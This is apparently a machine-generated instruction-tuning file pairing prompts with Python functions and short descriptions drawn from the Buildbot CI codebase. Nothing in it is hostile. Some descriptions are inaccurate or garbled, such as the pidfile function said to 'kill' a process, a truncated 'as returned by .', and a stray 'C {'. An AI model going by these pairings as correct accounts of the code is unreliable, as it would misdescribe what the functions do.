{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks if a pidfile exists and if it exists kills it if it exists", "response": "def checkPidFile(pidfile):\n    \"\"\" mostly comes from _twistd_unix.py which is not twisted public API :-/\n\n        except it returns an exception instead of exiting\n    \"\"\"\n    if os.path.exists(pidfile):\n        try:\n            with open(pidfile) as f:\n                pid = int(f.read())\n        except ValueError:\n            raise ValueError('Pidfile {} contains non-numeric value'.format(pidfile))\n        try:\n            os.kill(pid, 0)\n        except OSError as why:\n            if why.errno == errno.ESRCH:\n                # The pid doesn't exist.\n                print('Removing stale pidfile {}'.format(pidfile))\n                os.remove(pidfile)\n            else:\n                raise OSError(\"Can't check status of PID {} from pidfile {}: {}\".format(\n                    pid, pidfile, why))\n        else:\n            raise BusyError(\"'{}' exists - is this master still running?\".format(pidfile))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef loadOptionsFile(self, _here=None):\n\n        here = _here or os.path.abspath(os.getcwd())\n\n        if runtime.platformType == 'win32':\n            # never trust env-vars, use the proper API\n            from win32com.shell import shellcon, shell\n            appdata = shell.SHGetFolderPath(0, shellcon.CSIDL_APPDATA, 0, 0)\n            home = os.path.join(appdata, \"buildbot\")\n        else:\n            home = os.path.expanduser(\"~/.buildbot\")\n\n        searchpath = []\n        toomany = 20\n        while True:\n            searchpath.append(os.path.join(here, \".buildbot\"))\n            next = os.path.dirname(here)\n            if next == here:\n                break  # we've hit the root\n            here = next\n            toomany -= 1  # just in case\n            if toomany == 0:\n                print(\"I seem to have wandered up into the infinite glories \"\n                      \"of the heavens. Oops.\")\n                break\n\n        searchpath.append(home)\n\n        localDict = {}\n\n        for d in searchpath:\n            if os.path.isdir(d):\n                if runtime.platformType != 'win32':\n                    if os.stat(d)[stat.ST_UID] != os.getuid():\n                        print(\"skipping %s because you don't own it\" % d)\n                        continue  # security, skip other people's directories\n                optfile = os.path.join(d, \"options\")\n                if os.path.exists(optfile):\n                    try:\n                        with open(optfile, \"r\") as f:\n                            options = f.read()\n                        exec(options, localDict)\n                    except Exception:\n                        print(\"error while reading %s\" % optfile)\n                        raise\n                    break\n\n        for k in list(localDict.keys()):  # pylint: disable=consider-iterating-dictionary\n            if k.startswith(\"__\"):\n                del localDict[k]\n        return localDict", "response": "Load the options file."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a status for a branch.", "response": "def createStatus(self,\n                     project_id, branch, sha, state, target_url=None,\n                     description=None, context=None):\n        \"\"\"\n        :param project_id: Project ID from GitLab\n        :param branch: Branch name to create the status for.\n        :param sha: Full sha to create the status for.\n        :param state: one of the following 'pending', 'success', 'failed'\n                      or 'cancelled'.\n        :param target_url: Target url to associate with this status.\n        :param description: Short description of the status.\n        :param context: Context of the result\n        :return: A deferred with the result from GitLab.\n\n        \"\"\"\n        payload = {'state': state, 'ref': branch}\n\n        if description is not None:\n            payload['description'] = description\n\n        if target_url is not None:\n            payload['target_url'] = target_url\n\n        if context is not None:\n            payload['name'] = context\n\n        return self._http.post('/api/v4/projects/%d/statuses/%s' % (\n            project_id, sha),\n            json=payload)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef fromBrdict(cls, master, brdict):\n        cache = master.caches.get_cache(\"BuildRequests\", cls._make_br)\n        return cache.get(brdict['buildrequestid'], brdict=brdict, master=master)", "response": "Construct a new build request from a dictionary as returned by\n."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning True if both buildrequests can be merged via Deferred.", "response": "def canBeCollapsed(master, br1, br2):\n        \"\"\"\n        Returns true if both buildrequest can be merged, via Deferred.\n\n        This implements Buildbot's default collapse strategy.\n        \"\"\"\n        # short-circuit: if these are for the same buildset, collapse away\n        if br1['buildsetid'] == br2['buildsetid']:\n            return True\n\n        # get the buidlsets for each buildrequest\n        selfBuildsets = yield master.data.get(\n            ('buildsets', str(br1['buildsetid'])))\n        otherBuildsets = yield master.data.get(\n            ('buildsets', str(br2['buildsetid'])))\n\n        # extract sourcestamps, as dictionaries by codebase\n        selfSources = dict((ss['codebase'], ss)\n                           for ss in selfBuildsets['sourcestamps'])\n        otherSources = dict((ss['codebase'], ss)\n                            for ss in otherBuildsets['sourcestamps'])\n\n        # if the sets of codebases do not match, we can't collapse\n        if set(selfSources) != set(otherSources):\n            return False\n\n        for c, selfSS in selfSources.items():\n            otherSS = otherSources[c]\n            if selfSS['repository'] != otherSS['repository']:\n                return False\n\n            if selfSS['branch'] != otherSS['branch']:\n                return False\n\n            if selfSS['project'] != otherSS['project']:\n                return False\n\n            # anything with a patch won't be collapsed\n            if selfSS['patch'] or otherSS['patch']:\n                return False\n            # get changes & compare\n            selfChanges = yield master.data.get(('sourcestamps', selfSS['ssid'], 'changes'))\n            otherChanges = yield master.data.get(('sourcestamps', otherSS['ssid'], 'changes'))\n            # if both have changes, proceed, else fail - if no changes check revision instead\n            if selfChanges and otherChanges:\n                continue\n            elif selfChanges and not otherChanges:\n                return False\n\n            elif not selfChanges and otherChanges:\n                return False\n\n            # else check revisions\n            elif selfSS['revision'] != otherSS['revision']:\n                return False\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a list of sources that are merged with the sources of all the others.", "response": "def mergeSourceStampsWith(self, others):\n        \"\"\" Returns one merged sourcestamp for every codebase \"\"\"\n        # get all codebases from all requests\n        all_codebases = set(self.sources)\n        for other in others:\n            all_codebases |= set(other.sources)\n\n        all_merged_sources = {}\n        # walk along the codebases\n        for codebase in all_codebases:\n            all_sources = []\n            if codebase in self.sources:\n                all_sources.append(self.sources[codebase])\n            for other in others:\n                if codebase in other.sources:\n                    all_sources.append(other.sources[codebase])\n            assert all_sources, \"each codebase should have at least one sourcestamp\"\n\n            # TODO: select the sourcestamp that best represents the merge,\n            # preferably the latest one.  This used to be accomplished by\n            # looking at changeids and picking the highest-numbered.\n            all_merged_sources[codebase] = all_sources[-1]\n\n        return list(all_merged_sources.values())"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a reason for the merged build request.", "response": "def mergeReasons(self, others):\n        \"\"\"Return a reason for the merged build request.\"\"\"\n        reasons = []\n        for req in [self] + others:\n            if req.reason and req.reason not in reasons:\n                reasons.append(req.reason)\n        return \", \".join(reasons)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef bytes2NativeString(x, encoding='utf-8'):\n    if isinstance(x, bytes) and str != bytes:\n        return x.decode(encoding)\n    return x", "response": "Convert a bytes object to a native string."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef unicode2bytes(x, encoding='utf-8', errors='strict'):\n    if isinstance(x, text_type):\n        x = x.encode(encoding, errors)\n    return x", "response": "Convert a unicode string to bytes."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef bytes2unicode(x, encoding='utf-8', errors='strict'):\n    if isinstance(x, (text_type, type(None))):\n        return x\n    return text_type(x, encoding, errors)", "response": "Convert a C { bytes object to a unicode string."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nstarting the mock log files.", "response": "def start(self):\n        \"\"\"\n        Try to remove the old mock logs first.\n        \"\"\"\n        if self.resultdir:\n            for lname in self.mock_logfiles:\n                self.logfiles[lname] = self.build.path_module.join(self.resultdir,\n                                                                   lname)\n        else:\n            for lname in self.mock_logfiles:\n                self.logfiles[lname] = lname\n        self.addLogObserver('state.log', MockStateObserver())\n\n        cmd = remotecommand.RemoteCommand('rmdir', {'dir':\n                                                    [self.build.path_module.join('build', self.logfiles[l])\n                                                     for l in self.mock_logfiles]})\n        d = self.runCommand(cmd)\n        # must resolve super() outside of the callback context.\n        super_ = super()\n\n        @d.addCallback\n        def removeDone(cmd):\n            super_.start()\n        d.addErrback(self.failed)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _handle_stream_line(line):\n    # XXX This necessary processing is probably a bug from docker-py,\n    # hence, might break if the bug is fixed, i.e. we should get decoded JSON\n    # directly from the API.\n    line = json.loads(line)\n    if 'error' in line:\n        content = \"ERROR: \" + line['error']\n    else:\n        content = line.get('stream', '')\n    for streamline in content.split('\\n'):\n        if streamline:\n            yield streamline", "response": "Handles a single line from the Docker API."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn True if this build should be reported for this contact and also records the report for later", "response": "def shouldReportBuild(self, builder, buildnum):\n        \"\"\"Returns True if this build should be reported for this contact\n        (eliminating duplicates), and also records the report for later\"\"\"\n        for w, b, n in self.reported_builds:\n            if b == builder and n == buildnum:\n                return False\n        self.reported_builds.append([util.now(), builder, buildnum])\n\n        # clean the reported builds\n        horizon = util.now() - 60\n        while self.reported_builds and self.reported_builds[0][0] < horizon:\n            self.reported_builds.pop(0)\n\n        # and return True, since this is a new one\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef splitArgs(self, args):\n        try:\n            return shlex.split(args)\n        except ValueError as e:\n            raise UsageError(e)", "response": "Returns list of arguments parsed by shlex. split"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef getContact(self, user=None, channel=None):\n        try:\n            return self.contacts[(channel, user)]\n        except KeyError:\n            new_contact = self.contactClass(self, user=user, channel=channel)\n            self.contacts[(channel, user)] = new_contact\n            new_contact.setServiceParent(self)\n            return new_contact", "response": "get a Contact instance for user on channel"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef issue(self, test, err):\n        self.step.setProgress('tests failed', len(self.failures) +\n                              len(self.errors))", "response": "An issue - failing erroring etc test"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nprocesses a single change from GitLab Service and returns a list of dictionaries that represents the changes.", "response": "def _process_change(self, payload, user, repo, repo_url, event,\n                        codebase=None):\n        \"\"\"\n        Consumes the JSON as a python object and actually starts the build.\n\n        :arguments:\n            payload\n                Python Object that represents the JSON sent by GitLab Service\n                Hook.\n        \"\"\"\n        changes = []\n        refname = payload['ref']\n        # project name from http headers is empty for me, so get it from repository/name\n        project = payload['repository']['name']\n\n        # We only care about regular heads or tags\n        match = re.match(r\"^refs/(heads|tags)/(.+)$\", refname)\n        if not match:\n            log.msg(\"Ignoring refname `%s': Not a branch\" % refname)\n            return changes\n\n        branch = match.group(2)\n        if payload.get('deleted'):\n            log.msg(\"Branch `%s' deleted, ignoring\" % branch)\n            return changes\n\n        for commit in payload['commits']:\n            if not commit.get('distinct', True):\n                log.msg('Commit `%s` is a non-distinct commit, ignoring...' %\n                        (commit['id'],))\n                continue\n\n            files = []\n            for kind in ('added', 'modified', 'removed'):\n                files.extend(commit.get(kind, []))\n\n            when_timestamp = dateparse(commit['timestamp'])\n\n            log.msg(\"New revision: %s\" % commit['id'][:8])\n\n            change = {\n                'author': '%s <%s>' % (commit['author']['name'],\n                                       commit['author']['email']),\n                'files': files,\n                'comments': commit['message'],\n                'revision': commit['id'],\n                'when_timestamp': when_timestamp,\n                'branch': branch,\n                'revlink': commit['url'],\n                'repository': repo_url,\n                'project': project,\n                'category': event,\n                'properties': {\n                    'event': event,\n                },\n            }\n\n            if codebase is not None:\n                change['codebase'] = codebase\n\n            changes.append(change)\n\n        return changes"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nprocess a merge request change and returns a list of buildbot change objects.", "response": "def _process_merge_request_change(self, payload, event, codebase=None):\n        \"\"\"\n        Consumes the merge_request JSON as a python object and turn it into a buildbot change.\n\n        :arguments:\n            payload\n                Python Object that represents the JSON sent by GitLab Service\n                Hook.\n        \"\"\"\n        attrs = payload['object_attributes']\n        commit = attrs['last_commit']\n        when_timestamp = dateparse(commit['timestamp'])\n        # @todo provide and document a way to choose between http and ssh url\n        repo_url = attrs['target']['git_http_url']\n        # project name from http headers is empty for me, so get it from object_attributes/target/name\n        project = attrs['target']['name']\n\n        # Filter out uninteresting events\n        state = attrs['state']\n        if re.match('^(closed|merged|approved)$', state):\n            log.msg(\"GitLab MR#{}: Ignoring because state is {}\".format(attrs['iid'], state))\n            return []\n        action = attrs['action']\n        if not re.match('^(open|reopen)$', action) and not (action == \"update\" and \"oldrev\" in attrs):\n            log.msg(\"GitLab MR#{}: Ignoring because action {} was not open or \"\n                    \"reopen or an update that added code\".format(attrs['iid'],\n                                                                 action))\n            return []\n\n        changes = [{\n            'author': '%s <%s>' % (commit['author']['name'],\n                                   commit['author']['email']),\n            'files': [],  # @todo use rest API\n            'comments': \"MR#{}: {}\\n\\n{}\".format(attrs['iid'], attrs['title'], attrs['description']),\n            'revision': commit['id'],\n            'when_timestamp': when_timestamp,\n            'branch': attrs['target_branch'],\n            'repository': repo_url,\n            'project': project,\n            'category': event,\n            'revlink': attrs['url'],\n            'properties': {\n                'source_branch': attrs['source_branch'],\n                'source_project_id': attrs['source_project_id'],\n                'source_repository': attrs['source']['git_http_url'],\n                'source_git_ssh_url': attrs['source']['git_ssh_url'],\n                'target_branch': attrs['target_branch'],\n                'target_project_id': attrs['target_project_id'],\n                'target_repository': attrs['target']['git_http_url'],\n                'target_git_ssh_url': attrs['target']['git_ssh_url'],\n                'event': event,\n            },\n        }]\n        if codebase is not None:\n            changes[0]['codebase'] = codebase\n        return changes"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef getChanges(self, request):\n        expected_secret = isinstance(self.options, dict) and self.options.get('secret')\n        if expected_secret:\n            received_secret = request.getHeader(_HEADER_GITLAB_TOKEN)\n            received_secret = bytes2unicode(received_secret)\n\n            p = Properties()\n            p.master = self.master\n            expected_secret_value = yield p.render(expected_secret)\n\n            if received_secret != expected_secret_value:\n                raise ValueError(\"Invalid secret\")\n        try:\n            content = request.content.read()\n            payload = json.loads(bytes2unicode(content))\n        except Exception as e:\n            raise ValueError(\"Error loading JSON: \" + str(e))\n        event_type = request.getHeader(_HEADER_EVENT)\n        event_type = bytes2unicode(event_type)\n        # newer version of gitlab have a object_kind parameter,\n        # which allows not to use the http header\n        event_type = payload.get('object_kind', event_type)\n        codebase = request.args.get(b'codebase', [None])[0]\n        codebase = bytes2unicode(codebase)\n        if event_type in (\"push\", \"tag_push\", \"Push Hook\"):\n            user = payload['user_name']\n            repo = payload['repository']['name']\n            repo_url = payload['repository']['url']\n            changes = self._process_change(\n                payload, user, repo, repo_url, event_type, codebase=codebase)\n        elif event_type == 'merge_request':\n            changes = self._process_merge_request_change(\n                payload, event_type, codebase=codebase)\n        else:\n            changes = []\n        if changes:\n            log.msg(\"Received {} changes from {} gitlab event\".format(\n                len(changes), event_type))\n        return (changes, 'git')", "response": "Returns a generator that yields the changes from the gitlab event."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef onlyOnce(fn):\n    'Set up FN to only run once within an interpreter instance'\n    def wrap(*args, **kwargs):\n        if hasattr(fn, 'called'):\n            return\n        fn.called = 1\n        return fn(*args, **kwargs)\n    util.mergeFunctionMetadata(fn, wrap)\n    return wrap", "response": "Set up FN to only run once within an interpreter instance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the full spec of the connector as a list of dicts", "response": "def allEndpoints(self):\n        \"\"\"return the full spec of the connector as a list of dicts\n        \"\"\"\n        paths = []\n        for k, v in sorted(self.matcher.iterPatterns()):\n            paths.append(dict(path=\"/\".join(k),\n                              plural=str(v.rtype.plural),\n                              type=str(v.rtype.entityType.name),\n                              type_spec=v.rtype.entityType.getSpec()))\n        return paths"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nvalidating master (-m, --master) command line option. Checks that option is a string of the 'hostname:port' form, otherwise raises an UsageError exception. @type master: string @param master: master option @raise usage.UsageError: on invalid master option", "response": "def validateMasterOption(master):\n    \"\"\"\n    Validate master (-m, --master) command line option.\n\n    Checks that option is a string of the 'hostname:port' form, otherwise\n    raises an UsageError exception.\n\n    @type  master: string\n    @param master: master option\n\n    @raise usage.UsageError: on invalid master option\n    \"\"\"\n    try:\n        hostname, port = master.split(\":\")\n        port = int(port)\n    except (TypeError, ValueError):\n        raise usage.UsageError(\"master must have the form 'hostname:port'\")"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef addEnvPath(env, name, value):\n    try:\n        oldval = env[name]\n        if not oldval.endswith(';'):\n            oldval = oldval + ';'\n    except KeyError:\n        oldval = \"\"\n    if not value.endswith(';'):\n        value = value + ';'\n    env[name] = oldval + value", "response": "concat a path for this name"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef ping(self, status=None):\n        newping = not self.ping_watchers\n        d = defer.Deferred()\n        self.ping_watchers.append(d)\n        if newping:\n            Ping().ping(self.worker.conn).addBoth(self._pong)\n\n        return d", "response": "Ping the worker to make sure it is still there. Returns a Deferred\n        that fires with True if it is there."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nchecks that the user has a valid connection.", "response": "def checkAvailable(from_module):\n        \"\"\"Call me at checkConfig time to properly report config error\n           if neither txrequests or treq is installed\n        \"\"\"\n        if txrequests is None and treq is None:\n            config.error(\"neither txrequests nor treq is installed, but {} is requiring it\\n\\n{}\".format(\n                from_module, HTTPClientService.TREQ_PROS_AND_CONS))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef flattened_iterator(l, types=(list, tuple)):\n    if not isinstance(l, types):\n        yield l\n        return\n\n    for element in l:\n        for sub_element in flattened_iterator(element, types):\n            yield sub_element", "response": "Generator for a list or tuple that potentially contains nested lists and tuples of arbitrary nesting."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngives a list or tuple that potentially contains nested lists or tuples of arbitrary nesting flatten into a single dimension.", "response": "def flatten(l, types=(list, )):\n    \"\"\"\n    Given a list/tuple that potentially contains nested lists/tuples of arbitrary nesting,\n    flatten into a single dimension.  In other words, turn [(5, 6, [8, 3]), 2, [2, 1, (3, 4)]]\n    into [5, 6, 8, 3, 2, 2, 1, 3, 4]\n\n    This is safe to call on something not a list/tuple - the original input is returned as a list\n    \"\"\"\n    # For backwards compatibility, this returned a list, not an iterable.\n    # Changing to return an iterable could break things.\n    if not isinstance(l, types):\n        return l\n    return list(flattened_iterator(l, types))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef human_readable_delta(start, end):\n    start_date = datetime.datetime.fromtimestamp(start)\n    end_date = datetime.datetime.fromtimestamp(end)\n    delta = end_date - start_date\n\n    result = []\n    if delta.days > 0:\n        result.append('%d days' % (delta.days,))\n    if delta.seconds > 0:\n        hours = int(delta.seconds / 3600)\n        if hours > 0:\n            result.append('%d hours' % (hours,))\n        minutes = int((delta.seconds - hours * 3600) / 60)\n        if minutes:\n            result.append('%d minutes' % (minutes,))\n        seconds = delta.seconds % 60\n        if seconds > 0:\n            result.append('%d seconds' % (seconds,))\n\n    if result:\n        return ', '.join(result)\n    return 'super fast'", "response": "Return a string of human readable time delta."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef in_reactor(f):\n    def wrap(*args, **kwargs):\n        from twisted.internet import reactor, defer\n        result = []\n\n        def _async():\n            d = defer.maybeDeferred(f, *args, **kwargs)\n\n            @d.addErrback\n            def eb(f):\n                f.printTraceback()\n\n            @d.addBoth\n            def do_stop(r):\n                result.append(r)\n                reactor.stop()\n        reactor.callWhenRunning(_async)\n        reactor.run()\n        return result[0]\n    wrap.__doc__ = f.__doc__\n    wrap.__name__ = f.__name__\n    wrap._orig = f  # for tests\n    return wrap", "response": "decorate a function by running it with maybeDeferred in a reactor"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nmerges dictionary b into a", "response": "def dictionary_merge(a, b):\n    \"\"\"merges dictionary b into a\n       Like dict.update, but recursive\n    \"\"\"\n    for key, value in b.items():\n        if key in a and isinstance(a[key], dict) and isinstance(value, dict):\n            dictionary_merge(a[key], b[key])\n            continue\n        a[key] = b[key]\n    return a"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating nice summary logs.", "response": "def createSummary(self, log):\n        \"\"\"\n        Create nice summary logs.\n\n        @param log: log to create summary off of.\n        \"\"\"\n        warnings = self.obs.warnings\n        errors = []\n        if warnings:\n            self.addCompleteLog('%d Warnings' % len(warnings), \"\\n\".join(warnings))\n        if errors:\n            self.addCompleteLog('%d Errors' % len(errors), \"\\n\".join(errors))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef getOldestRequestTime(self):\n        bldrid = yield self.getBuilderId()\n        unclaimed = yield self.master.data.get(\n            ('builders', bldrid, 'buildrequests'),\n            [resultspec.Filter('claimed', 'eq', [False])],\n            order=['submitted_at'], limit=1)\n        if unclaimed:\n            return unclaimed[0]['submitted_at']", "response": "Returns the submitted_at of the oldest unclaimed build request for this builder or None if there are no build requests."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef getNewestCompleteTime(self):\n        bldrid = yield self.getBuilderId()\n        completed = yield self.master.data.get(\n            ('builders', bldrid, 'buildrequests'),\n            [resultspec.Filter('complete', 'eq', [False])],\n            order=['-complete_at'], limit=1)\n        if completed:\n            return completed[0]['complete_at']\n        else:\n            return None", "response": "Returns the complete_at of the latest completed build request for this builder or None if there are no such build requests."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef attached(self, worker, commands):\n        for w in self.attaching_workers + self.workers:\n            if w.worker == worker:\n                # already attached to them. This is fairly common, since\n                # attached() gets called each time we receive the builder\n                # list from the worker, and we ask for it each time we add or\n                # remove a builder. So if the worker is hosting builders\n                # A,B,C, and the config file changes A, we'll remove A and\n                # re-add it, triggering two builder-list requests, getting\n                # two redundant calls to attached() for B, and another two\n                # for C.\n                #\n                # Therefore, when we see that we're already attached, we can\n                # just ignore it.\n                return defer.succeed(self)\n\n        wfb = workerforbuilder.WorkerForBuilder()\n        wfb.setBuilder(self)\n        self.attaching_workers.append(wfb)\n\n        try:\n            wfb = yield wfb.attached(worker, commands)\n            self.attaching_workers.remove(wfb)\n            self.workers.append(wfb)\n            return self\n\n        except Exception as e:  # pragma: no cover\n            # already log.err'ed by WorkerForBuilder._attachFailure\n            # TODO: remove from self.workers (except that detached() should get\n            #       run first, right?)\n            log.err(e, 'worker failed to attach')\n            return None", "response": "This is invoked by the Worker when the self. workername bot is fully attached to a worker. This is invoked by the Worker when the self. workername bot is fully attached to a worker and ready to accept commands."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef getCollapseRequestsFn(self):\n        # first, seek through builder, global, and the default\n        collapseRequests_fn = self.config.collapseRequests\n        if collapseRequests_fn is None:\n            collapseRequests_fn = self.master.config.collapseRequests\n        if collapseRequests_fn is None:\n            collapseRequests_fn = True\n\n        # then translate False and True properly\n        if collapseRequests_fn is False:\n            collapseRequests_fn = None\n        elif collapseRequests_fn is True:\n            collapseRequests_fn = self._defaultCollapseRequestFn\n\n        return collapseRequests_fn", "response": "Helper function to determine which collapseRequests function to use for merging"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _spawnAsBatch(self, processProtocol, executable, args, env,\n                      path, usePTY):\n        \"\"\"A cheat that routes around the impedance mismatch between\n        twisted and cmd.exe with respect to escaping quotes\"\"\"\n\n        # NamedTemporaryFile differs in PY2 and PY3.\n        # In PY2, it needs encoded str and its encoding cannot be specified.\n        # In PY3, it needs str which is unicode and its encoding can be specified.\n        if PY3:\n            tf = NamedTemporaryFile(mode='w+', dir='.', suffix=\".bat\",\n                                    delete=False, encoding=self.builder.unicode_encoding)\n        else:\n            tf = NamedTemporaryFile(mode='w+', dir='.', suffix=\".bat\",\n                                    delete=False)\n\n        # echo off hides this cheat from the log files.\n        tf.write(u\"@echo off\\n\")\n        if isinstance(self.command, (string_types, bytes)):\n            tf.write(bytes2NativeString(self.command, self.builder.unicode_encoding))\n        else:\n            tf.write(win32_batch_quote(self.command, self.builder.unicode_encoding))\n        tf.close()\n\n        argv = os.environ['COMSPEC'].split()  # allow %COMSPEC% to have args\n        if '/c' not in argv:\n            argv += ['/c']\n        argv += [tf.name]\n\n        def unlink_temp(result):\n            os.unlink(tf.name)\n            return result\n        self.deferred.addBoth(unlink_temp)\n\n        return reactor.spawnProcess(processProtocol, executable, argv, env,\n                                    path, usePTY=usePTY)", "response": "A wrapper around reactor. spawnProcess that handles the batch command."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nyielding the data that we can send over PB.", "response": "def _chunkForSend(self, data):\n        \"\"\"\n        limit the chunks that we send over PB to 128k, since it has a hardwired\n        string-size limit of 640k.\n        \"\"\"\n        LIMIT = self.CHUNK_LIMIT\n        for i in range(0, len(data), LIMIT):\n            yield data[i:i + LIMIT]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ntake a dictionary of lists of output chunks and concatenate all the chunks into a single string", "response": "def _collapseMsg(self, msg):\n        \"\"\"\n        Take msg, which is a dictionary of lists of output chunks, and\n        concatenate all the chunks into a single string\n        \"\"\"\n        retval = {}\n        for logname in msg:\n            data = u\"\"\n            for m in msg[logname]:\n                m = bytes2unicode(m, self.builder.unicode_encoding)\n                data += m\n            if isinstance(logname, tuple) and logname[0] == 'log':\n                retval['log'] = (logname[1], data)\n            else:\n                retval[logname] = data\n        return retval"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncollapse and send the message to the master", "response": "def _sendMessage(self, msg):\n        \"\"\"\n        Collapse and send msg to the master\n        \"\"\"\n        if not msg:\n            return\n        msg = self._collapseMsg(msg)\n        self.sendStatus(msg)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _sendBuffers(self):\n        msg = {}\n        msg_size = 0\n        lastlog = None\n        logdata = []\n        while self.buffered:\n            # Grab the next bits from the buffer\n            logname, data = self.buffered.popleft()\n\n            # If this log is different than the last one, then we have to send\n            # out the message so far.  This is because the message is\n            # transferred as a dictionary, which makes the ordering of keys\n            # unspecified, and makes it impossible to interleave data from\n            # different logs.  A future enhancement could be to change the\n            # master to support a list of (logname, data) tuples instead of a\n            # dictionary.\n            # On our first pass through this loop lastlog is None\n            if lastlog is None:\n                lastlog = logname\n            elif logname != lastlog:\n                self._sendMessage(msg)\n                msg = {}\n                msg_size = 0\n            lastlog = logname\n\n            logdata = msg.setdefault(logname, [])\n\n            # Chunkify the log data to make sure we're not sending more than\n            # CHUNK_LIMIT at a time\n            for chunk in self._chunkForSend(data):\n                if not chunk:\n                    continue\n                logdata.append(chunk)\n                msg_size += len(chunk)\n                if msg_size >= self.CHUNK_LIMIT:\n                    # We've gone beyond the chunk limit, so send out our\n                    # message.  At worst this results in a message slightly\n                    # larger than (2*CHUNK_LIMIT)-1\n                    self._sendMessage(msg)\n                    msg = {}\n                    logdata = msg.setdefault(logname, [])\n                    msg_size = 0\n        self.buflen = 0\n        if logdata:\n            self._sendMessage(msg)\n        if self.sendBuffersTimer:\n            if self.sendBuffersTimer.active():\n                self.sendBuffersTimer.cancel()\n            self.sendBuffersTimer = None", "response": "Send all the content in our buffers."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _addToBuffers(self, logname, data):\n        n = len(data)\n\n        self.buflen += n\n        self.buffered.append((logname, data))\n        if self.buflen > self.BUFFER_SIZE:\n            self._sendBuffers()\n        elif not self.sendBuffersTimer:\n            self.sendBuffersTimer = self._reactor.callLater(\n                self.BUFFER_TIMEOUT, self._bufferTimeout)", "response": "Add data to the buffer for logname"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef remote_startCommand(self, stepref, stepId, command, args):\n        stepId = decode(stepId)\n        command = decode(command)\n        args = decode(args)\n\n        self.activity()\n\n        if self.command:\n            log.msg(\"leftover command, dropping it\")\n            self.stopCommand()\n\n        try:\n            factory = registry.getFactory(command)\n        except KeyError:\n            raise UnknownCommand(u\"unrecognized WorkerCommand '{0}'\".format(command))\n        self.command = factory(self, stepId, args)\n\n        log.msg(u\" startCommand:{0} [id {1}]\".format(command, stepId))\n        self.remoteStep = stepref\n        self.remoteStep.notifyOnDisconnect(self.lostRemoteStep)\n        d = self.command.doStart()\n        d.addCallback(lambda res: None)\n        d.addBoth(self.commandComplete)\n        return None", "response": "This method is called by the master - side RemoteCommand when it actually starts the build."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nhalts the current step.", "response": "def remote_interruptCommand(self, stepId, why):\n        \"\"\"Halt the current step.\"\"\"\n        log.msg(\"asked to interrupt current command: {0}\".format(why))\n        self.activity()\n        if not self.command:\n            # TODO: just log it, a race could result in their interrupting a\n            # command that wasn't actually running\n            log.msg(\" .. but none was running\")\n            return\n        self.command.doInterrupt()"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nmaking any currently - running command die with no further status output.", "response": "def stopCommand(self):\n        \"\"\"Make any currently-running command die, with no further status\n        output. This is used when the worker is shutting down or the\n        connection to the master has been lost. Interrupt the command,\n        silence it, and then forget about it.\"\"\"\n        if not self.command:\n            return\n        log.msg(\"stopCommand: halting current command {0}\".format(self.command))\n        self.command.doInterrupt()  # shut up! and die!\n        self.command = None"}
